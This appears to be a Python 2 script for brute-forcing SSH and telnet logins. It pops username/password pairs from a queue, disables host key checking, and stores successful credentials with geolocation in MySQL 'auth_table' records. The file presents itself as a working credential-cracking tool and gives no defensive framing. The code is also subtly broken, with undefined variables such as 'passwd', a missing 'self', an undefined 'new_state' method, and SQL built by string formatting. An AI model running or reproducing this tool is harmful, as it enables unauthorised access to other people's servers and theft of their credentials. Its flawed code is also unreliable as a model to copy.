import pexpect
import MySQLdb
import IP

from pexpect import pxssh  
import getpass  

class Connection:
    def __init__(self, ip, auth_queue, handle):
        self.auth_queue = auth_queue
        self.ip = ip
        self.hLog = handle
        self.auth = None
        self.child = None
        self.bQuit = False

    def run(self):
        try: 
            options = dict(StrictHostKeyChecking="no", UserKnownHostsFile="/dev/null")
            s = pxssh.pxssh(options)
            user, pwd = self.auth_queue.pop()
            s.login(self.ip, user, pwd, login_timeout=10)
            s.sendline ('uptime')  # run a command  
            s.prompt()             # match the prompt  
            print "Got password [%s] %s:%s" % (self.ip, user, passwd)
            self.write_to_db(self.ip, user, pwd)
            self.hLog.write("%s.\n", s.before)   # print everything before the propt.  
            s.logout() 
        except pxssh.ExceptionPxssh, e:  
            self.hLog.write("ssh failed on login. error is: %s \n" % str(e))
        except IndexError:
            self.bQuit = True
    
    def write_to_db(ip, user, pwd):
        try:
            db = MySQLdb.connect("localhost", "scanner",
                                 "scanner", "ssh_data", charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (
                ip, 22, user, passwd, IP.find(ip)))
            db.commit()
            print "[report] One result import to database"
        except:
            db.rollback()
        conn.bQuit = True
        db.close()


    def exit(self):
        if self.child:
            self.child.close(force=True)


class conn_state:
    @staticmethod
    def _run(conn):
        try:
            conn.child = pexpect.spawn("ssh %s" % conn.ip)
            conn.child.logfile_read = conn.hLog
            index = conn.child.expect(["sername:", "nter:", "ogin:","ccount:",
                                    "eject","refused","denied", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
            if index < 4:
                # print "Got flag %s" % conn.ip
                conn.auth = None
                conn.new_state(user_state)
            else:
                conn.bQuit = True
                return
        except:
            conn.hLog.write("\r\nSomething wrong in  conn_state._run().")
            conn.new_state(conn)

class user_state:
    @staticmethod
    def _run(conn):
        try:
            conn.auth = conn.auth_queue.pop()
        except IndexError:
            conn.bQuit = True
            return
        except:
            conn.bQuit = True
            return

        user = conn.auth[0]
        conn.hLog.write("\r\nPreparing send username (%s) to remote host." % user)
        conn.child.sendline(user)
        index = conn.child.expect(["ssword:", "sername:", "nter:","ccount:",
                                   "ogin:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
        if index == 0:
            conn.new_state(passwd_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)


class passwd_state:
    @staticmethod
    def _run(conn):
        if conn.auth:
            passwd = conn.auth[1]
        else:
            conn.bQuit = True
            return

        conn.hLog.write("\r\nPreparing send password (%s) to remote host." % passwd)
        conn.child.sendline(passwd)
        #"(?i)username:","(?i)enter:","(?i)account:","(?i)login:","(?i)pssword:",
        index = conn.child.expect([r"[>$~/]", "sername:", "nter:", "ccount:",
                                   "login:", pexpect.TIMEOUT, pexpect.EOF], timeout=30)
        if index == 0:
            conn.new_state(confirm_state)
        elif index < 4 and index > 0:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)


class confirm_state:
    @staticmethod
    def _run(conn):
        try:
            user, passwd = conn.auth
            if conn.auth == ("user", "password"):
                conn.bQuit = True
                return
            print "Got password [%s] %s:%s" % (conn.ip, user, passwd)
            db = MySQLdb.connect("localhost", "telnet",
                                 "telnet", "telnet_data", charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (
                conn.ip, 23, user, passwd, IP.find(conn.ip)))
            db.commit()
            print "[report] One result import to database"
        except:
            db.rollback()
        conn.bQuit = True
        conn.new_state(None)
        db.close()